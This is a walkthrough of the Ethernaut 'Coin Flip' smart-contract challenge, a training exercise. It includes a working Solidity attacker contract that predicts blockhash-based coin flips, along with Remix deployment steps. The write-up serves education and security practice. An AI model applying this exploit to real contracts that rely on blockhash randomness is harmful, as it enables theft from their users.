# Coin Flip Ethernaut Challenge

## Overview of the Vulnerability

The CoinFlip challenge is designed to demonstrate how contracts relying on predictable randomness can be exploited. The original CoinFlip contract determines the outcome of a coin flip using the blockhash of the previous block combined with a constant factor. Since blockhash is publicly accessible, an attacker can compute the expected outcome in advance and always make the correct guess. This allows them to win 10 consecutive flips and pass the challenge.

## Steps to Solve the Challenge
1. Get the CoinFlip Contract Address
Go to the Ethernaut challenge page for the Coin Flip level.

Open your browser's developer console (usually by pressing F12).

Run the following command in the console to get the address of the CoinFlip contract:

javascript
Copy
contract.address
Copy this address. You will need it to deploy your attacking contract.

2. Deploy the CoinFlipAttacker Contract in Remix
Open Remix (https://remix.ethereum.org/).
Create a new file (e.g., CoinFlipAttacker.sol) and paste the attacking contract code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public coinFlip;

    constructor(address _coinFlipAddress) {
        coinFlip = ICoinFlip(_coinFlipAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("Cannot call attack twice in the same block");
        }

        lastHash = blockValue;
        uint256 coinFlipResult = blockValue / FACTOR;
        bool guess = coinFlipResult == 1 ? true : false;

        bool result = coinFlip.flip(guess);
        if (result) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }
    }
}
```
Compile the contract:

Go to the "Solidity Compiler" tab in Remix.

Select the appropriate compiler version (e.g., 0.8.0).

Click "Compile CoinFlipAttacker.sol".

Deploy the contract:

Go to the "Deploy & Run Transactions" tab in Remix.

Select "Injected Web3" as the environment (this connects Remix to your MetaMask wallet, which should be connected to the Ethernaut testnet).

Paste the CoinFlip contract address (from Step 1) into the "Deploy" field.

Click "Deploy".

3. Call the attack Function
After deploying the CoinFlipAttacker contract, you will see it in the "Deployed Contracts" section in Remix.

Click on the attack function to call it.

Wait for the transaction to be mined.

4. Repeat the attack Function Call
You need to call the attack function 10 times, but you must wait for a new block to be mined between each call.

In Remix, you can manually call the function and wait ~15 seconds between each call to ensure a new block is mined.

Alternatively, you can automate this process using a script (see the Hardhat script example in my previous response).

5. Verify the Result
After calling the attack function 10 times, go back to the Ethernaut challenge page.

Check the consecutiveWins variable in the CoinFlip contract (you can do this in the console by running await contract.consecutiveWins()).

If the value is 10, submit the instance to complete the challenge.

Troubleshooting
If you encounter issues:

Check the CoinFlip Address:

Ensure you are using the correct address of the CoinFlip contract in the Ethernaut challenge.

Wait for New Blocks:

If you call the attack function multiple times in the same block, it will revert. Make sure to wait for a new block between each call.

Gas Limit:

Ensure you have enough gas when calling the attack function. In Remix, you can increase the gas limit manually.

Check the Console:

Use the browser console on the Ethernaut page to debug. For example, you can check the consecutiveWins value after each call to ensure it is incrementing.